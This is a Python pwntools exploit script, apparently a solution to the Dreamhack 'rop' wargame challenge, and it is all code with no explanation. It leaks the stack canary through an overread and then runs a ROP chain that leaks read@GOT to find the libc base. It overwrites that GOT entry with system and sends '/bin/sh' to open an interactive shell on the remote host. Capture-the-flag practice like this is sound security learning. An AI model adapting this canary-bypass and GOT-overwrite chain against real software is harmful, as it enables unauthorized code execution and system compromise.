#!/usr/bin/env python3
from pwn import *
p= remote("host8.dreamhack.games", 22495)
e= ELF("./rop")
lib = ELF("./libc.so.6")
buf = b'A'*0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
canary = u64(b'\x00' + p.recvn(7))
print('canary', hex(canary))

pop_rdi = 0x0000000000400853
ret = 0x0000000000400596
pop_rsi_r15 = 0x0000000000400851

readplt = e.plt['read']
readgot = e.got['read']
writeplt = e.plt['write']

# write(1, read_got, 8)
payload = b"A"*56 + p64(canary)*2
payload += p64(pop_rdi) + p64(1) 
payload += p64(pop_rsi_r15) + p64(readgot) + p64(0)
payload += p64(writeplt)

#change readgot -> system read(0, readgot, 8)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(readgot) + p64(0)
payload += p64(readplt)

# read(binsh)
payload += p64(pop_rdi) + p64(readgot + 0x8)
payload += p64(ret) + p64(readplt)

p.sendafter(b"Buf: ", payload)
readlib = u64(p.recvn(6) + b'\x00\x00')
libase = readlib - lib.symbols['read']
system = libase + lib.symbols['system']
print('read', readlib)
print('libc_base', libase)
print('system', system)
p.send(p64(system) + b"/bin/sh\x00")  

p.interactive()
